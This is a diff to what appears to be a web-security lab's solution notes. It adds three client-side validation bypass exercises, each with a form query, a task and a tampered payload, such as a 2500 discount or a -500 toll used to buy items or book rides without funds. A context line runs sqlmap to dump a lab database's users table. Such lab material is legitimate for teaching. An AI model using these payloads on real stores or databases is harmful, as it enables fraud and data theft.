@@ -215,4 +215,49 @@ python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 -T users --columns
 
  
 
+----------------------------------
+# Bypassing Client Side Filters
+
+## Client Side Validation Bypass Variant 1
+### query:
+email=john456%40gmail.com&password=123&fname=john&lname=john&terms=true
+
+### task:
+See how many client side filters you can bypass in the form below. 
+
+### payload:
+email=john456&password=123&fname=john&lname=john
+
+
+## Client Side Validation Bypass Variant 2
+### query:
+price=3000&discount=300&balance=1000
+
+### task:
+Your task is to buy the headphones with the balance you have in your wallet.
+
+### payload:
+
+*discount parameter: is vulnerable as it is not validated on server side other two paratmeters are validated at server side*
+
+price=3000&discount=2500&balance=1000
+
+
+## Client Side Validation Bypass Variant 3
+### query:
+bprice=1000&toll=200&balance=500
+
+### task:
+See if you can schedule the ride without adding money to your wallet by bypassing any of the client side filters.
+
+### payload:
+*toll parameter: is vulnerable as it is not validated on server side other two paratmeters are validated at server side*
+
+bprice=1000&toll=-500&balance=500
+
+
+
+
+
+
 
